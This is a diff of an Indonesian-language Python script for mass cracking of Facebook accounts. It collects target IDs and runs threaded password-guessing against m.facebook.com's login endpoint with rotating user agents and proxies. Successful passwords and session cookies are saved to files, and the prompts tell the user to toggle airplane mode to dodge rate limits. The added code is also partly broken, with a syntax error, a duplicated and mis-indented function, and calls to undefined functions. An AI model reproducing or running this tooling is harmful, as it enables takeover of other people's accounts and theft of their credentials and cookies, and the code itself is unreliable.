@@ -663,7 +663,7 @@ def dump_massal():
 	except IOError:
 		exit()
 	try:
-		jum = int(input('Mau Berapa Target ? : '))
+		jum = int(input('Mau Berapa Idz Target ? : '))
 	except ValueError:
 		print('>> Masukkan Angka Mas, Malah Huruff ')
 		exit()
@@ -674,7 +674,7 @@ def dump_massal():
 	yz = 0
 	for met in range(jum):
 		yz+=1
-		kl = input('Masukan Id Yang Ke : '+str(yz)+' : ')
+		kl = input('Masukan Idz Target Yang Ke : '+str(yz)+' : ')
 		uid.append(kl)
 	for userr in uid:
 		try:
@@ -918,18 +918,20 @@ def setting():
 	else:
 		print('>> Pilih Yang Bener ')
 		exit()
-	print('1. Validate')
+	print('1. validate2 ')
+	print('2. validate1 ')
 	###print('└──> 3. Touch  ')
 	##print('└──> 4. Mtouch ')
 	print('')
-	hc = input(' PILIH  : ')
+	hc = input(' Pilih  : ')
 	if hc in ['1','01']:
-		method.append('validate')
-	elif hc in ['']:
-		print('>> Pilih Yang Bener ')
-		setting()
+		method.append('validate2')
+	elif hc in ['2','02']:
+		method.append('validate1')
+	elif hc in ['3','03']
+		method.append('validate2')
 	else:
-		method.append('validate')
+		method.append('validate1')
 	print('')
 	_jembot_ = input('Tambahkan Apk? [Y/t] : ')
 	if _jembot_ in ['']:
@@ -955,9 +957,9 @@ def passwrd():
 	os.system('clear')
 	banner()
 	print('')
-	print(f'|Hasel {h}OK{x} Tersimpan Di : {h}OK/%s {x}'%(okc))
-	print(f'|Hasel {k}OK{x} Tersimpan Di : {k}CP/%s {x}'%(cpc))
-	print(f'| Mainkan ??KONTOL??MU {m}200{x} Id\n')
+	print(f'Hasil {h}OK{x} Tersimpan Di : {h}OK/%s {x}'%(okc))
+	print(f'Hasil {k}OK{x} Tersimpan Di : {k}CP/%s {x}'%(cpc))
+	print(f' Mainkan Mode Pesawat Setiap {m}200{x} Id\n')
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -993,14 +995,16 @@ def passwrd():
 				for xpwd in pwnya:
 					pwv.append(xpwd)
 			else:pass
-			if 'validate' in method:
-				pool.submit(method_validate,idf,pwv)
+			if 'validate2' in method:
+				pool.submit(validate2,idf,pwv)
+			elif 'validate1' in method:
+					pool.submit(validate1,idf,pwv)
 			else:
 				pool.submit(method_validate,idf,pwv)
 	print('')
-	cetak(nel('\t[cyan]✓[green] Crack Selesai[cyan] ✓[white] '))
-	print(f'[{b}•{x}]{h} SYAH-OK : {h}%s '%(ok))
-	print(f'{x}[{b}•{x}]{k} SYAH-CP : {k}%s{x} '%(cp))
+	cetak(nel('\t[cyan]✓[green] Crack Selesai Moga Bersyukur Dengan Hasilnya[cyan] ✓[white] '))
+	print(f'[{b}•{x}]{h} HSAIL-OK : {h}%s '%(ok))
+	print(f'{x}[{b}•{x}]{k} HASIL-CP : {k}%s{x} '%(cp))
 	print('')
 	print('>> Lanjut Crack Kembali ( Y/t ) ? ')
 	woi = input('>> Pilih : ')
@@ -1011,12 +1015,12 @@ def passwrd():
 		time.sleep(2)
 		exit()
 #--------------------[ METODE VALIDATE ]-----------------#
-def method_validate(idf,pwv):
+def method_validate2(idf,pwv):
 	global loop,ok,cp
 	bi = random.choice(['\33[m']) 
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write(f"\r [MOGA IJO] {h}{P}{b}{loop}{P}/{P}{len(id)}{P} {hh}OK:{P}{ok}{P} {kk}CP:{P}{cp}{x}  {P}{'{:.0%}'.format(loop/float(len(id)))}{P}  "),
+	sys.stdout.write(f"\r [ Mbasic ] {h}{P}{b}{loop}{P}/{P}{len(id)}{P} {hh}OK:{P}{ok}{P} {kk}CP:{P}{cp}{x}  {P}{'{:.0%}'.format(loop/float(len(id)))}{P}  "),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -1049,12 +1053,46 @@ def method_validate(idf,pwv):
 		except requests.exceptions.ConnectionError:
 			time.sleep(31)
 	loop+=1
-def Selamat():
-    print("")
-    clear()
-    jalan(f"{M}SELAMAT BERSENANG SENANG")
-    login()
-    
+	
+    def method_validate2(idf,pwv):
+	global loop,ok,cp
+	bi = random.choice(['\33[m']) 
+	pers = loop*100/len(id2)
+	fff = '%'
+	sys.stdout.write(f"\r [ Mobile ] {h}{P}{b}{loop}{P}/{P}{len(id)}{P} {hh}OK:{P}{ok}{P} {kk}CP:{P}{cp}{x}  {P}{'{:.0%}'.format(loop/float(len(id)))}{P}  "),
+	sys.stdout.flush()
+	ua = random.choice(ugen)
+	ua2 = random.choice(ugen2)
+	ses = requests.Session()
+	for pw in pwv:
+		try:
+			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
+			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
+			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
+			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
+			koki+=' m_pixel_ratio=2.625; wd=412x756'
+			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
+			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
+			if "checkpoint" in po.cookies.get_dict().keys():
+				print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}')
+				open('CP/'+cph,'a').write(idf+'|'+pw+'\n')
+				cp+=1
+				break
+			elif "c_user" in ses.cookies.get_dict().keys():
+				ok+=1
+				coki=po.cookies.get_dict()
+				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+				kukis = kuki.replace(f'c_user={idf};datr','sb')
+				print(f'\r{x}[{b}✓{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{kukis}\n{x}{ua}{N}')
+				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+				break	
+				
+			else:
+				continue
+		except requests.exceptions.ConnectionError:
+			time.sleep(31)
+	loop+=1
+
 #--------------------[ CHECK-OPSI-CHEKPOINT ]-------------------#
 def ceker(idf,pw):
 	global cp
